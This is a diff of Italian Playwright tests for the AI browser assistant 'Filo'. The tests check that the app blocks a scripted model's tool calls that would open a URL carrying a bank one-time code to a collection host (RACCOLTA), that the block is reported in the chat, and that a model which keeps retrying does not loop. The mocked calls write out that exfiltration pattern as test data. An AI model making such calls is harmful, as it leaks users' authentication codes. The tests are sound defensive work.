@@ -92,7 +92,10 @@ test('l’assistente di pagina non apre un indirizzo col codice monouso letto da
   const page = await testServer.openReady(openTab, PAGINA_OTP);
   await preparaModelli(app);
   await modelloFinto(app, {
-    aiuto: JSON.stringify({ action: 'filo', filo: { type: 'NAVIGA', url: `https://${RACCOLTA}/c?v=${CODICE}` }, text: 'Apro la pagina di verifica.' }),
+    aiuto: [
+      ['NON è partita', JSON.stringify({ text: 'Non l’ho aperto: conteneva il codice della banca.', status: 'done' })],
+      ['', JSON.stringify({ action: 'filo', filo: { type: 'NAVIGA', url: `https://${RACCOLTA}/c?v=${CODICE}` }, text: 'Apro la pagina di verifica.' })],
+    ],
   });
   const schedePrima = await shell.locator('.tab').count();
 
@@ -108,6 +111,8 @@ test('l’assistente di pagina non apre un indirizzo col codice monouso letto da
   await page.waitForTimeout(500);
   expect(apertoVerso(app, RACCOLTA), 'l’indirizzo col codice si è aperto').toBe(false);
   await expect(shell.locator('.tab')).toHaveCount(schedePrima);
+  // L'assistente lo sa, come per la ricerca fermata, e lo dice: la sua «Apro la pagina» non resta l'ultima parola.
+  await expect(page.locator('.sn-sidebar').getByText('Non l’ho aperto: conteneva il codice della banca.')).toBeVisible({ timeout: 20_000 });
   await page.screenshot({ path: 'tests/.shots/uscite-segreti-aiuto.png' });
 
   // Anche la ricerca dell'assistente: la domanda col codice non parte verso il motore.
@@ -531,4 +536,92 @@ test('la password che Filo propone si usa al messaggio dopo: non l’ha letta da
   await riaperta.locator('#sendBtn').click();
   await expect(riaperta.locator('.dash-bubble-filo', { hasText: 'Di nuovo nel terminale.' })).toBeVisible({ timeout: 20_000 });
   expect(JSON.stringify(await app.evaluate(() => globalThis.__visti))).not.toContain('nessuna conferma e nessun livello lo sblocca');
+});
+
+test('dopo un indirizzo fermato l’assistente di pagina lo sa anche alla domanda dopo, e non riprova all’infinito', async ({ app, shell, openTab, testServer }) => {
+  test.setTimeout(60_000);
+  const page = await testServer.openReady(openTab, PAGINA_OTP);
+  await preparaModelli(app);
+  // Un modello che insiste: anche dopo l'avviso riprova ad aprire lo stesso indirizzo.
+  await modelloFinto(app, { aiuto: [['l’hai aperta', JSON.stringify({ text: 'Rispondo.', status: 'done' })], ['', NAVIGA_COL_CODICE]] });
+  await apriAiuto(shell, page);
+  await scriviAllAiuto(page, 'aiutami a finire l’accesso');
+  expect(await esitoUscita(app, page)).toBe('fermato');
+  await expect(page.locator('.sn-sidebar-log', { hasText: "non ho aperto l'indirizzo" })).toHaveCount(2, { timeout: 10_000 });
+  // Le chiamate dell'assistente, non quelle del correttore sul suo campo di testo.
+  const giriAiuto = () => app.evaluate(() => globalThis.__visti.filter((m) => JSON.stringify(m).includes('ha aperto Aiuto')).length);
+  expect(await giriAiuto(), 'il secondo blocco non apre un altro giro').toBe(2);
+  await page.waitForTimeout(1_000);
+  expect(await giriAiuto()).toBe(2);
+
+  await scriviAllAiuto(page, 'l’hai aperta?');
+  await expect(page.locator('.sn-sidebar').getByText('Rispondo.')).toBeVisible({ timeout: 20_000 });
+  const domanda = (await app.evaluate(() => globalThis.__visti)).filter((m) => JSON.stringify(m).includes('l’hai aperta?') && JSON.stringify(m).includes('ha aperto Aiuto')).pop();
+  expect(JSON.stringify(domanda)).toContain('NON è partita, è stata fermata');
+  expect(apertoVerso(app, RACCOLTA)).toBe(false);
+});
+
+test('il bottone «apri file» con un indirizzo che porta fuori il codice letto non compare: la chat dice cosa ha fermato', async ({ app, shell }) => {
+  test.setTimeout(90_000);
+  await expect(shell.locator('.tab')).toHaveCount(1, { timeout: 8_000 });
+  const page = await newtab(app);
+  await preparaModelli(app);
+  await modelloFinto(app, {
+    giri: [
+      { toolCalls: [{ id: 'c1', name: 'ESEGUI_COMANDO', arguments: JSON.stringify({ comando: `echo "Il tuo codice monouso è ${CODICE}"` }) }] },
+      { toolCalls: [{ id: 'f1', name: 'APRI_FILE', arguments: JSON.stringify({ percorso: `https://${RACCOLTA}/c?v=${CODICE}`, etichetta: 'Apri la ricevuta' }) }] },
+      { text: 'Ecco la ricevuta.' },
+    ],
+  });
+  await page.locator('#input').fill('leggi la notifica della banca');
+  await page.locator('#sendBtn').click();
+  await expect(page.locator('.dash-bubble-filo', { hasText: 'Ecco la ricevuta' })).toBeVisible({ timeout: 20_000 });
+  await expect(page.locator('.dash-action-btn', { hasText: 'Apri la ricevuta' })).toHaveCount(0);
+  const activity = page.locator('.dash-activity').last();
+  await expect(activity.locator('.dash-activity-label')).toContainText("fermato un'azione");
+  await activity.locator('.dash-activity-head').click();
+  await expect(activity.locator('.dash-activity-row', { hasText: 'Non ho preparato il collegamento' }))
+    .toHaveText(/conteneva un codice letto dall'output di un comando/);
+  expect(apertoVerso(app, RACCOLTA)).toBe(false);
+});
+
+test('riaperta dalla Cronologia, la chat racconta come fermata l’azione fermata, e il modello lo sa', async ({ app, shell, openTab }) => {
+  test.setTimeout(90_000);
+  await expect(shell.locator('.tab')).toHaveCount(1, { timeout: 8_000 });
+  const page = await newtab(app);
+  await preparaModelli(app);
+  await senzaAccoglienza(app, page);
+  await modelloFinto(app, {
+    giri: [
+      { toolCalls: [{ id: 'c1', name: 'ESEGUI_COMANDO', arguments: JSON.stringify({ comando: `echo "Il tuo codice monouso è ${CODICE}"` }) }] },
+      { toolCalls: [{ id: 'n1', name: 'NAVIGA', arguments: JSON.stringify({ url: `https://${RACCOLTA}/c?v=${CODICE}` }) }] },
+      { text: 'Fatto quello che potevo.' },
+    ],
+  });
+  await page.locator('#input').fill('leggi la notifica della banca');
+  await page.locator('#sendBtn').click();
+  await expect(page.locator('.dash-bubble-filo', { hasText: 'Fatto quello' })).toBeVisible({ timeout: 20_000 });
+
+  let id = null;
+  await expect.poll(async () => {
+    id = await page.evaluate(async () => {
+      const r = await chrome.runtime.sendMessage({ type: 'filo_chats_list' });
+      for (const c of (r && r.chats) || []) {
+        const g = await chrome.runtime.sendMessage({ type: 'filo_chat_get', id: c.id });
+        if (JSON.stringify((g && g.chat) || {}).includes('Fatto quello')) return c.id;
+      }
+      return null;
+    });
+    return id;
+  }, { timeout: 10_000 }).toBeTruthy();
+  await openTab(`filo://dashboard/dashboard.html?chat=${encodeURIComponent(id)}`);
+  const riaperta = await newtab(app, 'filo://dashboard/dashboard.html?chat=');
+  const nota = riaperta.locator('.dash-bubble-note[data-replay]').first();
+  await expect(nota).toHaveText("Ha eseguito un comando e fermato un'azione", { timeout: 10_000 });
+
+  await modelloFinto(app, { giri: [{ text: 'No, non l’ho aperta.' }] });
+  await riaperta.locator('#input').fill('l’hai aperta la pagina?');
+  await riaperta.locator('#sendBtn').click();
+  await expect(riaperta.locator('.dash-bubble-filo', { hasText: 'No, non l’ho aperta.' })).toBeVisible({ timeout: 20_000 });
+  expect(JSON.stringify(await app.evaluate(() => globalThis.__visti))).toContain('NON fatte, fermate da Filo');
 });
